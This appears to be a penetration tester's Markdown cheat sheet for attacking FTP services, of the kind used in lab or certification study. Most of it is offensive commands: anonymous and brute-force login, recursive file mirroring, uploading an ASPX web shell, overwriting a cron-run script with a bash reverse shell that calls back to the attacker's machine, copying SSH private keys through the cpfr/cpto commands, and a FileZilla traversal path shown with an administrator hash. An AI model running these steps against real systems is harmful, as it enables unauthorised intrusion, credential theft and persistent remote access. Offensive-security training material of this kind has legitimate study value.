### Checks

- [ ] Check if you have anonymous access
- [ ] Check if you can upload a file to trigger a web shell through the web app
- [ ] Check if you can download backup files to extract included passwords
- [ ] Check the version of FTP for exploits

#### Explaoitable Settings
|**Setting**|**Description**|
|---|---|
|`anonymous_enable=YES`|Allowing anonymous login?|
|`anon_upload_enable=YES`|Allowing anonymous to upload files?|
|`anon_mkdir_write_enable=YES`|Allowing anonymous to create new directories?|
|`no_anon_password=YES`|Do not ask anonymous for password?|
|`anon_root=/home/username/ftp`|Directory for anonymous.|
|`write_enable=YES`|Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?|

#### FTP Enumeration
==CHECK TO SEE IF YOU CAN UPLOAD FILES!==
```bash - kali
ftp $TARGET 21
```
Admin login
```bash - kali
admin
```
Anonymous login
```bash - kali
anonymous
```
```bash - kali
nmap --script ftp-brute -p 21 $TARGET
```
Check for directory traversal:
```bash - kali
ls ../
```
Recursive Listing:
```bash - kali
ls -R
```

#### Exit Extended Passive Mode
```bash - kali
pass
```
```bash - kali
ls
```
Then switch to binary mode to upload files:
```bash - kali
bin
```
#### Downloading recursively
```bash - kali
wget --mirror 'ftp://anonymous:anonymous@$TARGET'
```
```bash - kali
wget -r ftp://anonymous@$TARGET:21
```
```bash - kali
wget -m ftp://anonymous:anonymous@$TARGET
```
```bash - kali
wget -m --no-passive ftp://anonymous:anonymous@$TARGET
```
#### Upload reverse shell
```bash - kali
binary
```
```bash - kali
put cmdasp.aspx
```
```bash - kali
firefox http://$TARGET/cmdasp.aspx
```
#### Display file without downloading
```bash - kali
get <FILENAME> -
```
#### Interact with the FTP service on the target using encrypted connection.
```bash - kali
openssl s_client -connect <FQDN/IP>:21 -starttls ftp
```
#### Existing scripts
Found a script on FTP called "cleanup.sh" that is part of cron job.  Made a reverse shell with same name, uploaded and overwrote.
clean.sh
```bash - kali
echo '#!/bin/bash \nbash -i >& /dev/tcp/$KALI/443 0>&1' > clean.sh
```
```bash - kali
ftp $TARGET
```
```bash - kali
cd scripts
```
```bash - kali
put clean.sh
```

 Run this command to find all ftp scripts
```bash - kali
find / -type f -name ftp* 2>/dev/null | grep scripts
```
#### Nmap vsftpd script
```bash - kali
nmap --script ftp-vsftpd-backdoor -p 21 $TARGET
```
#### copy id_rsa
```bash - kali
nc $TARGET 21
```
```bash - kali
cpfr /home/user/.ssh/id_rsa
```
```bash - kali
cpto /home/kali/id_rsa
```
[[Port 22 - SSH  ~#id_rsa]]
#### Home FTP Server
https://www.exploit-db.com/exploits/34050
#### FileZilla Directory Transversal
```
.....=C:/Program+Files/FileZilla+Server/FileZilla+Server.xml
```
`Username = administrator`
`Pass = e10adc3949ba59abbe56e057f20f883e`
To crack passwords, try:
[[Hashcat#FileZilla 0 9 55]]
#### vsftpd
Config file is most likely located at `/etc/vsftpd.conf`. If you can read this file, look for `anon_root=/srv` entry to find root directory of FTP.  `/srv` in this example.